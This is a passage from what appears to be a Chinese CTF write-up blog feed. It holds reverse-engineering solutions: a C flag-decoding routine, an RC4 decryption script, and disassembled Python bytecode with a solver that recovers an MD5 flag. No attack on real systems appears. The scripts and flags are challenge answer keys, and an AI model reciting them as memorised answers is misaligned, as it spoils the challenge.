class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span> flag4[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">46</span>,i;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] ^=  flag3[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag1[i]-=flag3[i];     <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag2[i]^=flag4[<span class="hljs-number">51</span>];<br>        flag1[i]+=flag2[<span class="hljs-number">47</span>+i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag4[i] +=  flag2[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>      flag1[i] ^=  flag2[i];  <br>        <br>    &#125;<br>    <span class="hljs-built_in">puts</span>(flag1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/YEfpTToMQZ5k9tAh/1731740136954-22b04d8b-11cc-4e68-975f-388449ed438e-076591.png" alt="1731740136954-22b04d8b-11cc-4e68-975f-388449ed438e.png"></p><p><a href="https://am1re-sudo.github.io/Coisni.github.io/">https://am1re-sudo.github.io/Coisni.github.io/</a></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731740295598-c781d21a-d0b5-44ca-bdd7-80939f47b3d8-684255.png" alt="1731740295598-c781d21a-d0b5-44ca-bdd7-80939f47b3d8.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731740258994-d4352f1c-b446-4e32-b6ef-135bab2b8195-869077.png" alt="1731740258994-d4352f1c-b446-4e32-b6ef-135bab2b8195.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731740506704-52bcd9d9-a296-4db9-8ccf-a1cc4c8ecea7-683760.png" alt="1731740506704-52bcd9d9-a296-4db9-8ccf-a1cc4c8ecea7.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import base64<br><br>def rc4_encrypt(data, key1):        # 加密<br>    key = bytes(key1, encoding=&#x27;utf-8&#x27;)<br>    enc = ARC4.new(key)<br>    res = enc.encrypt(data.encode(&#x27;utf-8&#x27;))<br>    res=base64.b64encode(res)<br>    res = str(res,&#x27;utf-8&#x27;)<br>    return res<br><br>def rc4_decrypt(data, key1):        # 解密<br>    data = base64.b64decode(data)<br>    key = bytes(key1, encoding=&#x27;utf-8&#x27;)<br>    enc = ARC4.new(key)<br>    res = enc.decrypt(data)<br>    res = str(res,&#x27;gbk&#x27;)<br>    return res<br><br><br>if __name__ == &quot;__main__&quot;:<br>    data = &#x27;Q7u+cyiOQtKHRMqZNzPpApgmTL4j+TE=&#x27;  # 需要解密的内容<br>    key = &#x27;lovebeforeBC&#x27;  # 加密key<br>    print(&#x27;解密后:&#x27;,rc4_decrypt(data, key))         # 解密方法<br></code></pre></td></tr></table></figure><h2 id="好像是python？"><a href="#好像是python？" class="headerlink" title="好像是python？"></a>好像是python？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><code class="hljs plain">1           0 LOAD_CONST               0 (&#x27;SYC&#123;MD5(input)&#125;&#x27;)<br>              2 STORE_NAME               0 (flag)<br><br>  2           4 LOAD_NAME                1 (print)<br>              6 LOAD_CONST               1 (&#x27;Please input0:&#x27;)<br>              8 CALL_FUNCTION            1<br>             10 POP_TOP<br><br>  3          12 LOAD_CONST               2 (&#x27;&#x27;)<br>             14 STORE_NAME               2 (input0)<br><br>  6          16 LOAD_CONST               3 (&lt;code object test2 at 0x00000245D4F44B30, file &quot;program.py&quot;, line 6&gt;)<br>             18 LOAD_CONST               4 (&#x27;test2&#x27;)<br>             20 MAKE_FUNCTION            0<br>             22 STORE_NAME               3 (test2)<br><br> 14          24 LOAD_CONST               5 (&lt;code object test at 0x00000245D4F44BE0, file &quot;program.py&quot;, line 14&gt;)<br>             26 LOAD_CONST               6 (&#x27;test&#x27;)<br>             28 MAKE_FUNCTION            0<br>             30 STORE_NAME               4 (test)<br><br> 28          32 LOAD_CONST               7 (13)<br>             34 STORE_NAME               5 (a)<br><br> 29          36 LOAD_CONST               8 (14)<br>             38 STORE_NAME               6 (b)<br><br> 30          40 LOAD_NAME                5 (a)<br>             42 LOAD_NAME                6 (b)<br>             44 LOAD_NAME                5 (a)<br>             46 BINARY_ADD<br>             48 BINARY_XOR<br>             50 STORE_NAME               7 (c)<br><br> 31          52 LOAD_NAME                6 (b)<br>             54 LOAD_CONST               9 (100)<br>             56 BINARY_MULTIPLY<br>             58 STORE_NAME               8 (d)<br><br> 32          60 LOAD_NAME                5 (a)<br>             62 LOAD_NAME                6 (b)<br>             64 BINARY_XOR<br>             66 STORE_NAME               9 (e)<br><br> 33          68 LOAD_NAME                8 (d)<br>             70 LOAD_NAME                7 (c)<br>             72 LOAD_CONST              10 (4)<br>             74 BINARY_MULTIPLY<br>             76 BINARY_SUBTRACT<br>             78 LOAD_NAME                9 (e)<br>             80 BINARY_ADD<br>             82 LOAD_CONST              11 (1)<br>             84 BINARY_SUBTRACT<br>             86 STORE_NAME              10 (m)<br><br> 35          88 LOAD_NAME               10 (m)<br>             90 LOAD_CONST              12 (26)<br>             92 BINARY_MODULO<br>             94 STORE_NAME              11 (r)<br><br> 37          96 LOAD_NAME                4 (test)<br>             98 LOAD_NAME                2 (input0)<br>            100 LOAD_NAME               11 (r)<br>            102 CALL_FUNCTION            2<br>            104 STORE_NAME              12 (cipher1)<br><br> 38         106 LOAD_NAME                3 (test2)<br>            108 LOAD_NAME               12 (cipher1)<br>            110 CALL_FUNCTION            1<br>            112 STORE_NAME              13 (cipher2)<br><br> 39         114 LOAD_CONST              13 (-1)<br>            116 LOAD_CONST              14 (-36)<br>            118 LOAD_CONST              12 (26)<br>            120 LOAD_CONST              15 (-5)<br>            122 LOAD_CONST               8 (14)<br>            124 LOAD_CONST              16 (41)<br>            126 LOAD_CONST              17 (6)<br>            128 LOAD_CONST              18 (-9)<br>            130 LOAD_CONST              19 (60)<br>            132 LOAD_CONST              20 (29)<br>            134 LOAD_CONST              21 (-28)<br>            136 LOAD_CONST              22 (17)<br>            138 LOAD_CONST              23 (21)<br>            140 LOAD_CONST              24 (7)<br>            142 LOAD_CONST              25 (35)<br>            144 LOAD_CONST              26 (38)<br>            146 LOAD_CONST              12 (26)<br>            148 LOAD_CONST              27 (48)<br>            150 BUILD_LIST              18<br>            152 STORE_NAME              14 (num)<br><br> 40         154 LOAD_NAME               15 (range)<br>            156 LOAD_CONST              28 (18)<br>            158 CALL_FUNCTION            1<br>            160 GET_ITER<br>        &gt;&gt;  162 FOR_ITER                38 (to 202)<br>            164 STORE_NAME              16 (i)<br><br> 41         166 LOAD_NAME               13 (cipher2)<br>            168 LOAD_NAME               16 (i)<br>            170 BINARY_SUBSCR<br>            172 LOAD_NAME               14 (num)<br>            174 LOAD_NAME               16 (i)<br>            176 BINARY_SUBSCR<br>            178 COMPARE_OP               3 (!=)<br>            180 POP_JUMP_IF_FALSE      192<br><br> 42         182 LOAD_NAME                1 (print)<br>            184 LOAD_CONST              29 (&#x27;wrong!&#x27;)<br>            186 CALL_FUNCTION            1<br>            188 POP_TOP<br>            190 JUMP_ABSOLUTE          162<br><br> 44     &gt;&gt;  192 LOAD_NAME                1 (print)<br>            194 LOAD_CONST              30 (&#x27;Rrrright!&#x27;)<br>            196 CALL_FUNCTION            1<br>            198 POP_TOP<br>            200 JUMP_ABSOLUTE          162<br>        &gt;&gt;  202 LOAD_CONST              31 (None)<br>            204 RETURN_VALUE<br><br>Disassembly of &lt;code object test2 at 0x00000245D4F44B30, file &quot;program.py&quot;, line 6&gt;:<br>  7           0 LOAD_CONST               1 (&#x27;SYC&#x27;)<br>              2 STORE_FAST               1 (key)<br><br>  8           4 LOAD_CONST               2 (18)<br>              6 STORE_FAST               2 (length)<br><br>  9           8 BUILD_LIST               0<br>             10 STORE_FAST               3 (cipher)<br><br> 10          12 LOAD_GLOBAL              0 (range)<br>             14 LOAD_FAST                2 (length)<br>             16 CALL_FUNCTION            1<br>             18 GET_ITER<br>        &gt;&gt;   20 FOR_ITER                48 (to 70)<br>             22 STORE_FAST               4 (i)<br><br> 11          24 LOAD_FAST                3 (cipher)<br>             26 LOAD_METHOD              1 (append)<br>             28 LOAD_GLOBAL              2 (ord)<br>             30 LOAD_FAST                0 (s2)<br>             32 LOAD_FAST                4 (i)<br>             34 BINARY_SUBSCR<br>             36 CALL_FUNCTION            1<br>             38 LOAD_FAST                4 (i)<br>             40 BINARY_XOR<br>             42 LOAD_GLOBAL              2 (ord)<br>             44 LOAD_FAST                1 (key)<br>             46 LOAD_FAST                4 (i)<br>             48 LOAD_CONST               3 (3)<br>             50 BINARY_MODULO<br>             52 BINARY_SUBSCR<br>             54 CALL_FUNCTION            1<br>             56 UNARY_INVERT<br>             58 LOAD_CONST               4 (1)<br>             60 BINARY_ADD<br>             62 BINARY_ADD<br>             64 CALL_METHOD              1<br>             66 POP_TOP<br>             68 JUMP_ABSOLUTE           20<br><br> 12     &gt;&gt;   70 LOAD_FAST                3 (cipher)<br>             72 RETURN_VALUE<br><br>Disassembly of &lt;code object test at 0x00000245D4F44BE0, file &quot;program.py&quot;, line 14&gt;:<br> 15           0 BUILD_LIST               0<br>              2 STORE_FAST               2 (result)<br><br> 16           4 LOAD_FAST                0 (s)<br>              6 GET_ITER<br>        &gt;&gt;    8 FOR_ITER               218 (to 228)<br>             10 STORE_FAST               3 (i)<br><br> 17          12 LOAD_CONST               1 (&#x27;A&#x27;)<br>             14 LOAD_FAST                3 (i)<br>             16 DUP_TOP<br>             18 ROT_THREE<br>             20 COMPARE_OP               1 (&lt;=)<br>             22 POP_JUMP_IF_FALSE       32<br>             24 LOAD_CONST               2 (&#x27;Z&#x27;)<br>             26 COMPARE_OP               1 (&lt;=)<br>             28 POP_JUMP_IF_FALSE       80<br>             30 JUMP_FORWARD             4 (to 36)<br>        &gt;&gt;   32 POP_TOP<br>             34 JUMP_FORWARD            44 (to 80)<br><br> 18     &gt;&gt;   36 LOAD_FAST                2 (result)<br>             38 LOAD_METHOD              0 (append)<br>             40 LOAD_GLOBAL              1 (chr)<br>             42 LOAD_GLOBAL              2 (ord)<br>             44 LOAD_FAST                3 (i)<br>             46 CALL_FUNCTION            1<br>             48 LOAD_GLOBAL              2 (ord)<br>             50 LOAD_CONST               1 (&#x27;A&#x27;)<br>             52 CALL_FUNCTION            1<br>             54 BINARY_SUBTRACT<br>             56 LOAD_FAST                1 (R)<br>             58 BINARY_ADD<br>             60 LOAD_CONST               3 (26)<br>             62 BINARY_MODULO<br>             64 LOAD_GLOBAL              2 (ord)<br>             66 LOAD_CONST               1 (&#x27;A&#x27;)<br>             68 CALL_FUNCTION            1<br>             70 BINARY_ADD<br>             72 CALL_FUNCTION            1<br>             74 CALL_METHOD              1<br>             76 POP_TOP<br>             78 JUMP_ABSOLUTE            8<br><br> 19     &gt;&gt;   80 LOAD_CONST               4 (&#x27;a&#x27;)<br>             82 LOAD_FAST                3 (i)<br>             84 DUP_TOP<br>             86 ROT_THREE<br>             88 COMPARE_OP               1 (&lt;=)<br>             90 POP_JUMP_IF_FALSE      100<br>             92 LOAD_CONST               5 (&#x27;z&#x27;)<br>             94 COMPARE_OP               1 (&lt;=)<br>             96 POP_JUMP_IF_FALSE      148<br>             98 JUMP_FORWARD             4 (to 104)<br>        &gt;&gt;  100 POP_TOP<br>            102 JUMP_FORWARD            44 (to 148)<br><br> 20     &gt;&gt;  104 LOAD_FAST                2 (result)<br>            106 LOAD_METHOD              0 (append)<br>            108 LOAD_GLOBAL              1 (chr)<br>            110 LOAD_GLOBAL              2 (ord)<br>            112 LOAD_FAST                3 (i)<br>            114 CALL_FUNCTION            1<br>            116 LOAD_GLOBAL              2 (ord)<br>            118 LOAD_CONST               4 (&#x27;a&#x27;)<br>            120 CALL_FUNCTION            1<br>            122 BINARY_SUBTRACT<br>            124 LOAD_FAST                1 (R)<br>            126 BINARY_ADD<br>            128 LOAD_CONST               3 (26)<br>            130 BINARY_MODULO<br>            132 LOAD_GLOBAL              2 (ord)<br>            134 LOAD_CONST               4 (&#x27;a&#x27;)<br>            136 CALL_FUNCTION            1<br>            138 BINARY_ADD<br>            140 CALL_FUNCTION            1<br>            142 CALL_METHOD              1<br>            144 POP_TOP<br>            146 JUMP_ABSOLUTE            8<br><br> 21     &gt;&gt;  148 LOAD_CONST               6 (&#x27;0&#x27;)<br>            150 LOAD_FAST                3 (i)<br>            152 DUP_TOP<br>            154 ROT_THREE<br>            156 COMPARE_OP               1 (&lt;=)<br>            158 POP_JUMP_IF_FALSE      168<br>            160 LOAD_CONST               7 (&#x27;9&#x27;)<br>            162 COMPARE_OP               1 (&lt;=)<br>            164 POP_JUMP_IF_FALSE      216<br>            166 JUMP_FORWARD             4 (to 172)<br>        &gt;&gt;  168 POP_TOP<br>            170 JUMP_FORWARD            44 (to 216)<br><br> 22     &gt;&gt;  172 LOAD_FAST                2 (result)<br>            174 LOAD_METHOD              0 (append)<br>            176 LOAD_GLOBAL              1 (chr)<br>            178 LOAD_GLOBAL              2 (ord)<br>            180 LOAD_FAST                3 (i)<br>            182 CALL_FUNCTION            1<br>            184 LOAD_GLOBAL              2 (ord)<br>            186 LOAD_CONST               6 (&#x27;0&#x27;)<br>            188 CALL_FUNCTION            1<br>            190 BINARY_SUBTRACT<br>            192 LOAD_FAST                1 (R)<br>            194 BINARY_ADD<br>            196 LOAD_CONST               8 (10)<br>            198 BINARY_MODULO<br>            200 LOAD_GLOBAL              2 (ord)<br>            202 LOAD_CONST               6 (&#x27;0&#x27;)<br>            204 CALL_FUNCTION            1<br>            206 BINARY_ADD<br>            208 CALL_FUNCTION            1<br>            210 CALL_METHOD              1<br>            212 POP_TOP<br>            214 JUMP_ABSOLUTE            8<br><br> 24     &gt;&gt;  216 LOAD_FAST                2 (result)<br>            218 LOAD_METHOD              0 (append)<br>            220 LOAD_FAST                3 (i)<br>            222 CALL_METHOD              1<br>            224 POP_TOP<br>            226 JUMP_ABSOLUTE            8<br><br> 25     &gt;&gt;  228 LOAD_CONST               9 (&#x27;&#x27;)<br>            230 LOAD_METHOD              3 (join)<br>            232 LOAD_FAST                2 (result)<br>            234 CALL_METHOD              1<br>            236 RETURN_VALUE<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import hashlib<br>cipher = [-1, -36, 26, -5, 14, 41, 6, -9, 60, 29, -28, 17, 21, 7, 35, 38, 26,<br>48]<br>r = 14<br>key = &#x27;SYC&#x27;<br>data = []<br>for i in range(18):<br>    data.append((cipher[i] + ord(key[i % 3])) ^ i)<br>    print(data)<br> # [82, 52, 95, 77, 99, 105, 95, 87, 119, 121, 55, 95, 100, 109, 104, 118, 99,98]<br>char_list = [chr(num) for num in data]<br>s1 = &#x27;&#x27;.join(char_list)<br>print(s1)<br># R4_Mci_Wwy7_dmhvcb<br>def re_rot13(s, R):<br>    result = []<br>    for i in s:<br>        if &#x27;A&#x27; &lt;= i &lt;= &#x27;Z&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;A&#x27;) - R) % 26 + ord(&#x27;A&#x27;)))<br>        elif &#x27;a&#x27; &lt;= i &lt;= &#x27;z&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;a&#x27;) - R) % 26 + ord(&#x27;a&#x27;)))<br>        elif &#x27;0&#x27; &lt;= i &lt;= &#x27;9&#x27;:<br>            result.append(chr((ord(i) - ord(&#x27;0&#x27;) - R) % 10 + ord(&#x27;0&#x27;)))<br>        else:<br>            result.append(i)<br>    return &#x27;&#x27;.join(result)<br>s2 = re_rot13(s1, r)<br>print(s2)<br># D0_You_Iik3_python<br>flag = hashlib.md5(s2.encode()).hexdigest()<br>print(&quot;SYC&#123;&quot; + flag + &quot;&#125;&quot;)<br>#SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125;<br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote><p>更新: 2025-06-04 14:32:30<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/pnesyxxce7k7tyxb">https://www.yuque.com/chaye-apqbl/vsc85q/pnesyxxce7k7tyxb</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E6%9A%91%E5%81%87%E5%86%85%E9%83%A8%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/%E6%9A%91%E5%81%87%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    
